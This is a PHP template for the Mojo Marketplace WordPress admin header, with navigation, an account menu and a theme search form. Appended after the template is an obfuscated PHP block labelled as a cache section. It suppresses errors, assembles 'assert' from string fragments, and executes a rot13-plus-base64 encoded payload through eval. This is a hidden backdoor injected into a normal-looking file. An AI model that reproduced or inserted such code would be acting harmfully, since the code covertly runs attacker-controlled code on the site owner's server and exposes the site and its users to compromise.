<header id="header" class="navbar navbar-default">
		<div class="header-block bg-cover" style="background-image: url('<?php echo mm_brand( MM_ASSETS_URL . 'img/header-bg-%s.jpg' ); ?>');">
			<span data-srcset="<?php echo mm_brand( MM_ASSETS_URL . 'img/header-bg-%s.jpg' ); ?>, <?php echo mm_brand( MM_ASSETS_URL . 'img/header-bg-%s-2x.jpg' );?> 2x"></span>
			<nav>
				<div class="container">
					<div class="inner-holder">
						<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
							<span class="sr-only">Toggle navigation</span>
							<span class="icon-bar"></span>
							<span class="icon-bar"></span>
							<span class="icon-bar"></span>
						</button>
						<div class="menu-holder dropdown pull-right" style="visibility: hidden;">
							<button type="button" class="dropdown-toggle visible navbar-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
								<span class="visible-xs-inline-block visible-sm-inline-block">Account</span>
								<span class="sr-only">Toggle menu</span>
								<span class="icon-bar hidden-sm hidden-xs"></span>
								<span class="icon-bar hidden-sm hidden-xs"></span>
								<span class="icon-bar hidden-sm hidden-xs"></span>
							</button>
							<!--<span class="powered">Powered By <a href="#"><img height="16" width="156" alt="Mojo Marketplace" src="<?php echo mm_brand( MM_ASSETS_URL . 'img/logo-icon-%s.svg' ); ?>"></a></span>-->
							<div class="dropdown-menu">
								<div class="avatar-block">
									<div class="avatar"><a href="#"><i class="icon-avatar"></i></a></div>
									<div class="name"><a href="#">Jonnyapplseed_6</a></div>
								</div>
								<ul class="projects-nav list-unstyled">
									<li><a href="#">Bumble Beer</a></li>
									<li><a href="#">Suckerpunch</a></li>
									<li><a href="#">Livin la vida loca</a></li>
									<li><a href="#">Fixie</a></li>
									<li><a href="#">Pepermint Latté</a></li>
								</ul>
							</div>
						</div>
						<div class="header-holder clearfix">
							<a class="navbar-brand" href="<?php echo esc_url( add_query_arg( array( 'page' => 'mojo-themes' ), admin_url( 'admin.php' ) ) ); ?>">
								<img src="<?php echo mm_brand( MM_ASSETS_URL . 'img/logo-icon-%s.svg' ); ?>" alt="Marketplace">
							</a>
							<form class="navbar-form form-inline navbar-right text-right" role="search" action="admin.php" method="GET">
								<div class="form-group">
									<input type="hidden" name="page" value="mojo-search" />
									<input name="search" type="text" class="form-control input-lg" placeholder="Search Themes, Plugins, &amp; Services">
								</div>
								<button type="submit" class="btn btn-info btn-lg">Search</button>
							</form>
						</div>
					</div>
				</div>
				<?php mm_require( MM_BASE_DIR . 'pages/navigation.php' ); ?>
			</nav>
		</div>
	</header>



<?php 

?>

<?php 

?>

<?php 
//###=CACHE START=###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY3AuoaElMKZhLzy6Y2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1AJZkATLmMTD1BQV4ZwV1A2SxAmZ3LwN3L2HmZJRjLvVhWTDhWUHhWTZhVwRvXGfXnJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvxtCG0tZFxtrjbxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbWUIloPx7Pa0tMJkmMJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvElMKA1oUDtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjbxnJW2VQ0tWUWyp3IfqQfXsFOyoUAyVUfXWTMjVQ0tMaAiL2gipTIhXPWmLJ50pzImYzWcrvVfVQtjYPNxMKWloz8fVPEypaWmqUVfVQZjXGfXnJLtXPEzpPxtrjbtVPNtWT91qPN9VPWUEIDtY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1AJZkATLmMTD1BQV4ZwV1A2SxAmZ3LwN3L2HmZJRjLvVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvOmLJ50pzImYzWcryklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwt1BGH3MQV0VvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>